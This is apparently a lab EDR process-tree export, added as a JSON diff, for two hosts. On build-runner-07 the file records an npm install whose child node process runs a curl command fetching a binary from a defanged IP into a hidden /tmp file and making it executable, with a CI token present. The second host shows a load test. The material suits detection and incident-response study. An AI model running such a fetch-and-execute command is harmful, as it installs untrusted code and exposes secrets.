@@ -1,0 +1,118 @@
+{
+  "_meta": {
+    "source": "EDR process-tree export (lab snapshot)",
+    "collected_at": "2026-11-02T04:05:00Z"
+  },
+  "hosts": {
+    "build-runner-07": {
+      "processes": [
+        {
+          "pid": 1,
+          "ppid": 0,
+          "cmd": "/sbin/init",
+          "user": "root",
+          "started": "2026-11-02T02:58:00Z"
+        },
+        {
+          "pid": 41002,
+          "ppid": 1,
+          "cmd": "bash -lc ci-build.sh",
+          "user": "runner",
+          "started": "2026-11-02T03:11:40Z"
+        },
+        {
+          "pid": 44120,
+          "ppid": 41002,
+          "cmd": "npm install --no-audit",
+          "user": "runner",
+          "started": "2026-11-02T03:12:02Z"
+        },
+        {
+          "pid": 44121,
+          "ppid": 44120,
+          "cmd": "node index.js",
+          "user": "runner",
+          "started": "2026-11-02T03:12:09Z"
+        },
+        {
+          "pid": 44122,
+          "ppid": 44121,
+          "cmd": "sh -c curl -sSfL hxxp://198.51.100.77/b -o /tmp/.x && chmod +x /tmp/.x",
+          "user": "runner",
+          "started": "2026-11-02T03:14:01Z"
+        }
+      ],
+      "network": [
+        {
+          "pid": 44121,
+          "dst": "198.51.100.77:443",
+          "asn": "AS215199",
+          "count": 6,
+          "first_seen": "2026-11-02T03:14:00Z",
+          "sni": "metrics-cdn.example"
+        },
+        {
+          "pid": 44121,
+          "dst": "104.16.0.35:443",
+          "asn": "AS13335",
+          "count": 41,
+          "first_seen": "2026-11-02T03:12:10Z",
+          "sni": "registry.npmjs.org"
+        }
+      ],
+      "env_flags": {
+        "ci_token_env_present": true,
+        "no_new_privs": true,
+        "network_policy": "egress-open"
+      }
+    },
+    "app-frontend-03": {
+      "processes": [
+        {
+          "pid": 1,
+          "ppid": 0,
+          "cmd": "/sbin/init",
+          "user": "root",
+          "started": "2026-11-04T08:55:00Z"
+        },
+        {
+          "pid": 2210,
+          "ppid": 1,
+          "cmd": "node server.js",
+          "user": "app",
+          "started": "2026-11-04T09:02:00Z"
+        },
+        {
+          "pid": 2288,
+          "ppid": 2210,
+          "cmd": "wrk -t4 -c200 https://staging.internal/api",
+          "user": "app",
+          "started": "2026-11-04T09:29:00Z"
+        }
+      ],
+      "network": [
+        {
+          "pid": 2288,
+          "dst": "45.61.0.12:443",
+          "asn": "AS64500",
+          "count": 2,
+          "first_seen": "2026-11-04T09:30:00Z",
+          "sni": "staging.internal"
+        },
+        {
+          "pid": 2210,
+          "dst": "104.16.0.35:443",
+          "asn": "AS13335",
+          "count": 88,
+          "first_seen": "2026-11-04T09:02:10Z",
+          "sni": "registry.npmjs.org"
+        }
+      ],
+      "env_flags": {
+        "ci_token_env_present": false,
+        "no_new_privs": true,
+        "network_policy": "egress-restricted"
+      }
+    }
+  }
+}
